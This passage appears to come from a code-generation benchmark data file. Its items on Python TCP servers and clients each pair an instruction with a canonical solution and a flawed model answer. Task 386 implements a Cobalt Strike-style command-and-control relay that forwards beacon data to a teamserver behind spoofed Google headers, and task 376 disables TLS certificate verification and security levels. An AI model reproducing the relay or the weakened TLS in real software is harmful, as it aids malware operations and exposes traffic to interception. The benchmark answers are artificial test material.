0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Implement a TCP client in Python that can handle multiple types of HTTP requests concurrently using threading and locking mechanisms to manage shared resources.\n\nFunction Description: The code consists of two main functions that perform HTTP GET requests to a server. `long_request` handles a request with a large response, processing it in chunks with delays, while `time_request` handles a quicker request. A threading lock is used to synchronize access to shared resources between these concurrent requests.\n\nInput:\n- `hostname` (str): The target server's hostname or IP address\n- `port` (int): The target server's port number\n- `headers` (str): Additional HTTP headers to include in the request\n\nOutput:\n- Both functions print status messages ('acquire' and 'release') to indicate lock status\n- No explicit return value, but data is received from the server and processed\n- Network connections are properly closed when complete\n\nMethods:\n- `long_request(hostname, port, headers) -> None`: \n  Performs a long-running HTTP GET request, receiving data in chunks with delays between receives. Releases a lock after initial processing and continues receiving more data.\n\n- `time_request(hostname, port, headers) -> None`: \n  Performs a quicker HTTP GET request, acquires a lock before execution, receives all data at once, and closes the connection.\n\nShared Resource:\n- `lock` (threading.Lock): A threading lock used to synchronize access between the two request functions",
    "Canonical_solution": "import sys\nimport socket\nimport time\nimport threading\n\ndef long_request(hostname, port, headers):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /huge HTTP/1.0' + headers)\n    for i in range(1):\n        s.recv(80)\n        time.sleep(0.1)\n    lock.release()\n    print('release')\n    for i in range(10):\n        s.recv(80)\n        time.sleep(0.1)\n    s.close()\n\ndef time_request(hostname, port, headers):\n    lock.acquire()\n    print('acquire')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /tuple HTTP/1.0' + headers)\n    s.recv(900)\n    s.close()\n\nlock = threading.Lock()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport threading\nimport time\n\nlock = threading.Lock()\n\ndef long_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((hostname, port))\n        s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + hostname.encode() + b'\\r\\n' + headers.encode() + b'\\r\\n\\r\\n')\n        lock.acquire()\n        print('acquire')\n        data = s.recv(1024)\n        while data:\n            time.sleep(0.1)\n            data = s.recv(1024)\n        lock.release()\n        print('release')\n\ndef time_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((hostname, port))\n        s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + hostname.encode() + b'\\r\\n' + headers.encode() + b'\\r\\n\\r\\n')\n        lock.acquire()\n        print('acquire')\n        data = s.recv(1024)\n        while data:\n            data = s.recv(1024)\n        lock.release()\n        print('release')\n```"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: The task involves creating a Python function that reads log files, extracts specific messages, and sends them to a server using TCP socket communication. The function should parse log entries, identify relevant messages, and transmit them to the appropriate server ports based on the protocol specified in the logs.\n\nFunction Description: The function `send_messages_to_server` processes a log file to extract session IDs, protocols, and hexadecimal messages. It then establishes TCP connections to servers based on the protocols (using ports defined in an XML configuration file) and sends the decoded messages to the respective servers. The function includes a delay between messages to avoid overwhelming the server.\n\nInput: \n- `path` (str): The file path to the log file that contains the messages to be processed and sent. The log file should have entries matching the pattern `YYYY-MM-DD HH:MM:SS  INFO: [SESSION_ID: PROTOCOL < IP_ADDRESS] HEX_MESSAGE`.\n\nOutput: \n- None: The function does not return any value but performs side effects by sending messages to the server and closing the connections.\n\nNote: The function relies on an external XML file (`default.xml`) located in a `../setup/` directory relative to the script's location. This XML file should contain port mappings for different protocols under entries with keys ending in `.port`.",
    "Canonical_solution": "import sys\nimport re\nimport os\nimport xml.etree.ElementTree\nimport socket\nimport binascii\nimport time\n\ndef load_ports():\n    ports = {}\n    dir = os.path.dirname(os.path.abspath(__file__))\n    root = xml.etree.ElementTree.parse(dir + '/../setup/default.xml').getroot()\n    for entry in root.findall('entry'):\n        key = entry.attrib['key']\n        if key.endswith('.port'):\n            ports[key[:-5]] = int(entry.text)\n    return ports\n\ndef send_messages_to_server(path):\n    p = re.compile(r\"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}  INFO: \\[([TU][0-9a-fA-F]{8}): (\\S+) < [\\d.]+] ([0-9a-fA-F]+)\")\n    ports = load_ports()\n    protocols = {}\n    messages = {}\n\n    for line in open(path):\n        m = p.match(line)\n        if m:\n            session = m.group(1)\n            protocol = m.group(2)\n            message = m.group(3)\n            protocols[session] = protocol\n            if session not in messages:\n                messages[session] = []\n            messages[session].append(message)\n\n    for session in protocols:\n        port = ports[protocols[session]]\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((\"localhost\", int(port)))\n        for message in messages[session]:\n            s.send(binascii.unhexlify(message))\n            time.sleep(0.1)\n        s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport os\nimport re\nimport socket\nimport time\nimport xml.etree.ElementTree as ET\n\ndef send_messages_to_server(path):\n    # Read the XML configuration file\n    xml_path = os.path.join(os.path.dirname(__file__), '../setup/default.xml')\n    tree = ET.parse(xml_path)\n    root = tree.getroot()\n\n    # Open the log file\n    with open(path, 'r') as f:\n        for line in f:\n            # Parse the log entry\n            match = re.match(r'(\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}) INFO: \\[(\\w+): (\\w+) < \\d+\\.\\d+\\.\\d+\\.\\d+] ([0-9A-Fa-f]+)', line)\n            if match:\n                timestamp, session_id, protocol, hex_message = match.groups()\n\n                # Get the port for the protocol from the XML configuration\n                port = root.find(f'{protocol}.port').text\n\n                # Decode the hexadecimal message\n                message = bytes.fromhex(hex_message).decode('utf-8')\n\n                # Send the message to the server\n                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                    s.connect(('localhost', int(port)))\n                    s.sendall(message.encode('utf-8'))\n                    time.sleep(0.1)  # Delay between messages\n```"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a thread-safe TCP socket wrapper class that handles connection management, data transmission, and SSL/TLS encryption with proper resource cleanup.\n\nClass Description: SafeStreamSocket is a robust socket wrapper that provides safe connection handling, unique socket identification, and SSL/TLS capabilities. It manages socket lifecycle including proper cleanup and supports both IPv4 and Unix domain sockets.\n\nAttributes:\n_id: [int] - Unique identifier for the socket instance\n_dup_sock: [socket.socket] - Duplicate socket used during SSL/TLS handshake\n_name: [str] - Optional name identifier for the socket\n_sock: [socket.socket] - Main socket connection object\n_finalizer: [weakref.finalize] - Weak reference finalizer for cleanup\n_id_numbers: [class attribute, list[int]] - Tracks all active socket IDs\n_n: [class attribute, list[int]] - Counter for generating unique IDs\n\nMethods:\n__init__: [constructor](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> None - Initializes socket connection with the given address\n_acquire_uid: [_acquire_uid]() -> int - Generates a unique ID for the socket instance\n_connect: [_connect](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket - Establishes connection to the specified address\n_cleanup: [_cleanup]() -> None - Performs cleanup operations when socket is closed\n_release_uid: [_release_uid](id: int) -> None - Releases the socket ID when closed\nclose: [close]() -> None - Closes the socket connection\nclosed: [property]() -> bool - Returns whether socket is closed\nid: [property]() -> int - Returns socket ID\nname: [property]() -> str - Gets socket name\nname: [setter](new_name: str) -> None - Sets socket name\nget_socket: [get_socket]() -> socket.socket - Returns underlying socket object\nrecv: [recv](bufsize: int = 4096) -> bytes - Receives data from socket\nrecvall: [recvall](size: int) -> bytearray - Receives exact amount of data\nsendall: [sendall](data: Union[bytes, bytearray]) -> int - Sends all data through socket\nswitch_to_ssl: [switch_to_ssl](pemfile: str) -> None - Upgrades connection to SSL/TLS\n__enter__: [__enter__]() -> SafeStreamSocket - Context manager entry\n__exit__: [__exit__](*args) -> None - Context manager exit",
    "Canonical_solution": "import logging\nimport os\nimport socket\nimport ssl\nimport threading\nimport typing\nimport weakref\nfrom typing import Any, Union\n\nclass SafeStreamSocket:\n    def __init__(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = None\n        self._sock = self._connect(addr)\n        self._finalizer = weakref.finalize(self, self._cleanup)\n\n    def _acquire_uid(self) -> int:\n        with threading.Lock():\n            self._id_numbers.append(self._n[0])\n            _id = self._n[0]\n            self._n[0] += 1\n        logging.debug(\"Opening socket: id=%d\", _id)\n        return _id\n\n    def _connect(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            return addr\n        if isinstance(addr, str):\n            if ':' in addr:\n                host, port = addr.split(\":\", 1)\n                addr = (host, int(port))\n                family = socket.AF_INET\n            elif os.path.exists(addr):\n                family = socket.AF_UNIX\n            else:\n                raise SocketError(f\"socket unix:{addr} unable to connect\")\n        else:\n            family = socket.AF_INET\n        sock = socket.socket(family, socket.SOCK_STREAM)\n        sock.connect(addr)\n        return sock\n\n    def _cleanup(self):\n        self._release_uid(self.id)\n        sock = self._dup_sock or self._sock\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        sock.close()\n\n    def _release_uid(self, id: int):\n        try:\n            self._id_numbers.remove(id)\n        except ValueError:\n            pass\n        logging.debug(\"Closing socket, id=%d\", id)\n\n    def close(self):\n        self._finalizer()\n\n    @property\n    def closed(self) -> bool:\n        return not self._finalizer.alive\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str):\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        try:\n            return self._sock.recv(bufsize)\n        except socket.timeout as e:\n            raise SocketError(\"socket timeout\") from e\n        except ssl.SSLError as e:\n            raise SocketError(\"ssl error\") from e\n        except Exception as e:\n            raise SocketError(\"socket error\") from e\n\n    def recvall(self, size: int) -> bytearray:\n        buf = bytearray()\n        while len(buf) < size:\n            chunk = self.recv(size-len(buf))\n            if not chunk:\n                raise SocketError(\"recvall: socket connection broken\")\n            buf.extend(chunk)\n        return buf\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        try:\n            return self._sock.sendall(data)\n        except Exception as e:\n            raise SocketError(\"sendall error\") from e\n\n    def switch_to_ssl(self, pemfile):\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n        try:\n            context.verify_mode = ssl.CERT_NONE\n            context.set_ciphers(\"ALL:@SECLEVEL=0\")\n        except ssl.SSLError:\n            pass\n        self._dup_sock = self._sock.dup()\n        context.load_cert_chain(pemfile, keyfile=pemfile)\n        context.check_hostname = False\n        self._sock = context.wrap_socket(self._sock, server_hostname=\"iphone.localhost\")\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, *args):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport ssl\nimport weakref\nfrom typing import Union, Tuple, Any\n\nclass SafeStreamSocket:\n    _id_numbers = []\n    _n = 0\n\n    def __init__(self, addr: Union[str, Tuple[str, int], socket.socket, Any]):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = None\n        self._sock = self._connect(addr)\n        self._finalizer = weakref.finalize(self, self._cleanup)\n\n    def _acquire_uid(self) -> int:\n        if not self._id_numbers:\n            self._id_numbers.append(0)\n        self._n += 1\n        return self._id_numbers[-1]\n\n    def _connect(self, addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            return addr\n        return socket.create_connection(addr)\n\n    def _cleanup(self) -> None:\n        self._release_uid(self._id)\n        if self._sock:\n            self._sock.close()\n            self._sock = None\n\n    def _release_uid(self, id: int) -> None:\n        self._id_numbers.remove(id)\n\n    def close(self) -> None:\n        self._cleanup()\n\n    @property\n    def closed(self) -> bool:\n        return self._sock is None\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str) -> None:\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        return self._sock.recv(bufsize)\n\n    def recvall(self, size: int) -> bytearray:\n        data = bytearray()\n        while len(data) < size:\n            packet = self._sock.recv(size - len(data))\n            if not packet:\n                break\n            data.extend(packet)\n        return data\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        return self._sock.sendall(data)\n\n    def switch_to_ssl(self, pemfile: str) -> None:\n        self._dup_sock = self._sock\n        self._sock = ssl.wrap_socket(self._dup_sock, certfile=pemfile, server_side=False)\n\n    def __enter__(self) -> 'SafeStreamSocket':\n        return self\n\n    def __exit__(self, *args) -> None:\n        self.close()\n```\n"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Implement a TCP server that can handle multiple client connections, process incoming packets, and send replies asynchronously using Python's socket module and Scapy's networking capabilities.\n\nClass Description: AnsweringMachineTCP is a TCP server implementation that listens on a specified port, accepts client connections, and processes incoming packets using Scapy's packet handling capabilities. It supports asynchronous packet sniffing and reply generation for each connected client.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\ncls: [Type[Packet]] - The Scapy packet class used for parsing incoming data\noptsniff: [dict] - Dictionary of additional options for the sniffer configuration\nsniffer: [threading.Thread] - Background thread running the sniffing process\n\nMethods:\n__init__(port=80, cls=conf.raw_layer, **kargs) -> [None] - Initializes the answering machine with specified port, packet class, and additional options\nclose() -> [None] - Closes all resources (placeholder implementation)\nreply(pkt, send_function=None, address=None) -> [None] - Processes incoming packets and sends replies if appropriate\nsniff() -> [None] - Main server loop that accepts connections and starts sniffers for each client\nsniff_bg() -> [None] - Starts the sniffing process in a background thread\nis_request(req) -> [bool] - Determines if a packet should be processed (default always True)\nmake_reply(req, address=None) -> [Packet] - Generates a reply packet (default returns input packet)\nsend_reply(reply, send_function=None) -> [None] - Sends the generated reply to the client",
    "Canonical_solution": "import socket\nfrom typing import Optional, Type, Any\nfrom scapy.arch import get_if_addr\nfrom scapy.config import conf\nfrom scapy.packet import Packet\nfrom scapy.supersocket import StreamSocket\nimport functools\nfrom scapy.sendrecv import AsyncSniffer\n\nclass AnsweringMachineTCP:\n    \"\"\"\n    An answering machine that use the classic socket.socket to\n    answer multiple TCP clients\n    \"\"\"\n    TYPE = socket.SOCK_STREAM\n\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n\n    def close(self):\n        pass\n\n    def reply(self, pkt, send_function=None, address=None):\n        if not self.is_request(pkt):\n            return\n        if address:\n            reply = self.make_reply(pkt, address=address)\n        else:\n            reply = self.make_reply(pkt)\n        if not reply:\n            return\n        if send_function:\n            self.send_reply(reply, send_function=send_function)\n        else:\n            self.send_reply(reply)\n\n    def sniff(self):\n        ssock = socket.socket(socket.AF_INET, self.TYPE)\n        try:\n            ssock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        except OSError:\n            pass\n        ssock.bind(\n            (get_if_addr(self.optsniff.get(\"iface\", conf.iface)), self.port))\n        ssock.listen()\n        sniffers = []\n        try:\n            while True:\n                clientsocket, address = ssock.accept()\n                sock = StreamSocket(clientsocket, self.cls)\n                optsniff = self.optsniff.copy()\n                optsniff[\"prn\"] = functools.partial(self.reply,\n                                                    send_function=sock.send,\n                                                    address=address)\n                del optsniff[\"iface\"]\n                sniffer = AsyncSniffer(opened_socket=sock, **optsniff)\n                sniffer.start()\n                sniffers.append((sniffer, sock))\n        finally:\n            for (sniffer, sock) in sniffers:\n                try:\n                    sniffer.stop()\n                except Exception:\n                    pass\n                sock.close()\n            self.close()\n            ssock.close()\n\n    def sniff_bg(self):\n        self.sniffer = threading.Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return 1\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom scapy.all import sniff, conf, Packet\n\nclass AnsweringMachineTCP:\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n        self.sniffer = None\n\n    def close(self):\n        pass\n\n    def reply(self, pkt, send_function=None, address=None):\n        if self.is_request(pkt):\n            reply = self.make_reply(pkt, address)\n            self.send_reply(reply, send_function)\n\n    def sniff(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('', self.port))\n        sock.listen(5)\n        while True:\n            client_sock, address = sock.accept()\n            self.sniff_bg(client_sock, address)\n\n    def sniff_bg(self, client_sock, address):\n        def _sniff():\n            sniff(prn=lambda pkt: self.reply(pkt, send_function=client_sock.sendto, address=address), **self.optsniff)\n        self.sniffer = threading.Thread(target=_sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return True\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        send_function(reply)\n```"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Implement a TCP server class that receives OAuth tokens through a local socket connection, handling the incoming HTTP request and extracting the authorization code or error message.\n\nClass Description: OAuthTokenReceiver is a class that creates a TCP server to listen for OAuth token responses on a specified local port. It handles the HTTP response, extracts the authorization code, and manages error cases.\n\nAttributes:\nport: int - The local port number on which the server will listen for incoming OAuth token responses (default: 31337)\n\nMethods:\nreceive_oauth_token: receive_oauth_token() -> str - Listens for an incoming connection, receives the OAuth token response, sends an HTTP success response, and returns the extracted authorization code. Raises an exception if the response contains an error description.",
    "Canonical_solution": "import socket\nimport re\nimport urllib.parse\n\nclass OAuthTokenReceiver:\n    def __init__(self, port=31337):\n        self.port = port\n\n    def receive_oauth_token(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('127.0.0.1', self.port))\n        sock.listen(1)\n        conn, addr = sock.accept()\n        data = conn.recv(1024)\n        conn.sendall('HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><head><title>Recon-ng</title></head><body>Response received. Return to Recon-ng.</body></html>')\n        conn.close()\n        \n        if 'error_description' in data:\n            error = urllib.parse.unquote_plus(re.search(r'error_description=([^\\s&]*)', data).group(1))\n            raise Exception(error)\n        \n        authorization_code = re.search(r'code=([^\\s&]*)', data).group(1)\n        return authorization_code",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport http.server\nimport urllib.parse\n\nclass OAuthTokenReceiver:\n    def __init__(self, port=31337):\n        self.port = port\n\n    def receive_oauth_token(self) -> str:\n        server_address = ('localhost', self.port)\n        httpd = http.server.HTTPServer(server_address, self.RequestHandler)\n        print(f\"Listening for OAuth token responses on port {self.port}...\")\n\n        with httpd:\n            httpd.handle_request()\n\n    class RequestHandler(http.server.BaseHTTPRequestHandler):\n        def do_GET(self):\n            query = urllib.parse.urlparse(self.path).query\n            params = urllib.parse.parse_qs(query)\n\n            if 'error' in params:\n                error_description = params['error_description'][0]\n                raise Exception(f\"OAuth error: {error_description}\")\n\n            if 'code' in params:\n                authorization_code = params['code'][0]\n                self.send_response(200)\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n                self.wfile.write(b\"OAuth token received successfully.\")\n                return authorization_code\n\n            self.send_response(400)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(b\"Invalid request.\")\n            return None\n```\n"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Implement a TCP server that handles client connections, processes incoming data, and interacts with a teamserver through HTTP requests. The server should be able to read and write data based on client requests.\n\nFunction Description: The function `cc2_tcp_server` creates a TCP server that listens for client connections on a specified port. It processes incoming messages to either read data from or write data to a teamserver via HTTP requests. The server handles each client connection in a loop, processing the data and closing the connection afterward.\n\nInput: None (The function binds to a hardcoded IP address and port, and processes incoming client connections.)\n\nOutput: None (The function sends responses to clients but does not return any value.)\n\n---\n\nTask Description: Implement helper functions to support the TCP server's operations, including reading from and writing to a teamserver, parsing raw data, and extracting beacon data.\n\nFunction Description: The function `read_cs_teamserver` sends an HTTP GET request to a teamserver with metadata and extracts beacon data from the response. The function `write_cs_teamserver` sends an HTTP POST request to a teamserver with metadata. The function `parseRawData` splits raw data into a beacon ID and metadata. The function `find_beacon_data` extracts beacon data from a string based on prefix and suffix markers.\n\nInput:\n- `read_cs_teamserver`: `metadata` (str) - The metadata to include in the HTTP GET request.\n- `write_cs_teamserver`: `id` (str) - The beacon ID to include in the HTTP POST request URL; `metadata` (str) - The metadata to include in the HTTP POST request body.\n- `parseRawData`: `rawData` (str) - The raw data string to parse.\n- `find_beacon_data`: `prefix` (str) - The prefix marker for beacon data; `suffix` (str) - The suffix marker for beacon data; `data` (str) - The string to search for beacon data.\n\nOutput:\n- `read_cs_teamserver`: `beacon_data` (str) - The extracted beacon data from the HTTP response.\n- `write_cs_teamserver`: None (The function sends an HTTP POST request but does not return any value.)\n- `parseRawData`: `bid` (str) - The extracted beacon ID; `metadata` (str) - The extracted metadata.\n- `find_beacon_data`: `beacon_data` (str) - The extracted beacon data, or an empty string if not found.",
    "Canonical_solution": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sockobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)\n    sockobj.bind(('127.0.0.1', 7777))\n    sockobj.listen(1000)\n\n    while True:\n        connection, address = sockobj.accept()\n        msgHeader = connection.recv(7)\n        if msgHeader == 'read|||':\n            data = connection.recv(10024)\n            metadata = read_cs_teamserver(data)\n            if len(metadata) > 0:\n                connection.send(metadata)\n        elif msgHeader == 'write||':\n            rawData = connection.recv(10024)\n            bid, metadata = parseRawData(rawData)\n            if len(metadata) > 0 and len(bid) > 0:\n                write_cs_teamserver(bid, metadata)\n        connection.close()\n\ndef read_cs_teamserver(metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_get_send\",\n                \"Cookie\": \"SESSION={}\".format(metadata),\n                \"Connection\": \"cc2_rebind_protocol_get_send\"\n    }\n    res = requests.get(\"http://127.0.0.1:443/aaaaaaaaa\", headers=headers)\n    start = \"ffffffff1\"\n    end = \"eeeeeeee2\"\n    beacon_data = find_beacon_data(start, end, res.content)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_post_send\",\n                \"Connection\": \"keep-alive\",\n                \"Content-Length\": \"{}\".format(len(metadata))\n    }\n    res = requests.post(\"http://127.0.0.1:443/bbbbbbbbb?SESSION={}\".format(id), headers=headers, data=metadata)\n\ndef parseRawData(rawData):\n    split = '->|<-'\n    split_index = rawData.find(split)\n    bid = rawData[:split_index]\n    metadata = rawData[len(split)+split_index:]\n    return bid,metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    s_index = data.find(prefix) + 1\n    s_end = data.find(suffix)\n    beacon_data = ''\n    if (s_index > 0 and s_end > 0 and (s_index + len(prefix) + 1) != s_end:\n        beacon_data = data[s_index + len(prefix):s_end]\n    return beacon_data",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport requests\nimport json\nimport base64\nimport re\n\ndef cc2_tcp_server():\n    HOST = '127.0.0.1'\n    PORT = 9999\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind((HOST, PORT))\n        s.listen()\n        while True:\n            conn, addr = s.accept()\n            with conn:\n                print('Connected by', addr)\n                while True:\n                    data = conn.recv(1024)\n                    if not data:\n                        break\n                    print('Received', repr(data))\n                    bid, metadata = parseRawData(data.decode())\n                    beacon_data = read_cs_teamserver(metadata)\n                    conn.sendall(beacon_data.encode())\n                    write_cs_teamserver(bid, metadata)\n\ndef read_cs_teamserver(metadata):\n    url = 'http://127.0.0.1:8080/beacon'\n    headers = {'Content-Type': 'application/json'}\n    data = {'metadata': metadata}\n    response = requests.get(url, headers=headers, data=json.dumps(data))\n    beacon_data = find_beacon_data('beacon_data:', '}', response.text)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    url = 'http://127.0.0.1:8080/beacon/' + id\n    headers = {'Content-Type': 'application/json'}\n    data = {'metadata': metadata}\n    requests.post(url, headers=headers, data=json.dumps(data))\n\ndef parseRawData(rawData):\n    bid, metadata = rawData.split('|')\n    return bid, metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    pattern = re.compile(prefix + '(.+)' + suffix)\n    match = pattern.search(data)\n    if match:\n        return match.group(1)\n    else:\n        return ''\n```"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a TCP server that collects and serves Jetson device statistics using the jtop library, with optional HTTP response formatting.\n\nFunction Description: The function establishes a TCP server that listens for incoming connections. When a client connects, it retrieves system statistics from the Jetson device using jtop, formats them as JSON, and sends them to the client. The function can optionally wrap the JSON data in a basic HTTP response.\n\nInput:\n- host (str, optional): IP address to bind the server to (default: \"127.0.0.1\")\n- port (int, optional): Port number to listen on (default: 65432)\n- http (bool, optional): Flag to enable HTTP response formatting (default: False)\n\nOutput: None (The function runs indefinitely until interrupted or an error occurs, sending data to connected clients but not returning any value)",
    "Canonical_solution": "import socket\nimport json\nfrom jtop import jtop, JtopException\n\ndef jtop_server(host=\"127.0.0.1\", port=65432, http=False):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((host, port))\n    sock.listen(1)\n    \n    try:\n        with jtop() as jetson:\n            while jetson.ok():\n                conn, addr = sock.accept()\n                stats = json.dumps(jetson.stats)\n                if http:\n                    message = \"HTTP/1.1 200 OK\\r\\nHost: {host}:{port}\\r\\nContent-Type: application/json\\r\\nContent-Length: {length}\\r\\n\\r\\n{stats}\"\n                    conn.send(message.format(host=host, port=port, length=len(stats), stats=stats.encode()))\n                else:\n                    conn.send(stats.encode())\n                conn.close()\n    except JtopException as e:\n        print(e)\n    except Exception as e:\n        print(e)\n    finally:\n        sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport json\nimport jtop\nimport threading\n\ndef tcp_server(host=\"127.0.0.1\", port=65432, http=False):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind((host, port))\n        s.listen()\n        print(f\"Server listening on {host}:{port}\")\n\n        def handle_client(client_socket):\n            with client_socket:\n                jtop_instance = jtop.JTOP()\n                jtop_instance.start()\n                while True:\n                    data = jtop_instance.get()\n                    if http:\n                        response = f\"HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\n\\r\\n{json.dumps(data)}\"\n                    else:\n                        response = json.dumps(data)\n                    client_socket.sendall(response.encode())\n\n        while True:\n            client_socket, addr = s.accept()\n            print(f\"Connection from {addr}\")\n            client_handler = threading.Thread(target=handle_client, args=(client_socket,))\n            client_handler.start()\n```\n"
  },
  {
    "Task_id": 389,
    "Instruction": "Task Description: Create a TCP server class that handles incoming client connections, receives data, and writes it to a file, with options for debugging and multiprocessing support.\n\nClass Description: EventGeneric is a TCP server implementation that listens for incoming connections, receives byte data from clients, and writes it to a binary file. It supports running in a separate process and provides debugging capabilities through logging.\n\nAttributes:\n- name: str - Identifier for the event instance and log file\n- isDebug: bool - Flag to enable debug logging\n- shared_key: Any - Optional shared key for inter-process communication\n- port: int - TCP port to listen on (auto-assigned if not specified)\n- addr: str - IP address to bind to (defaults to \"0.0.0.0\")\n- file: str - Path to the output binary file\n- logger: logging.Logger - Debug logger instance (only when isDebug=True)\n\nMethods:\n- __init__(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> None - Initializes the TCP server with optional address, port, name, shared key, and debug flag\n- serve() -> None - Main server loop that binds to the socket, accepts connections, and handles data reception\n- spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> Tuple[int, multiprocessing.Process] - Static method to create and start the server in a separate process, returns the port number and process object",
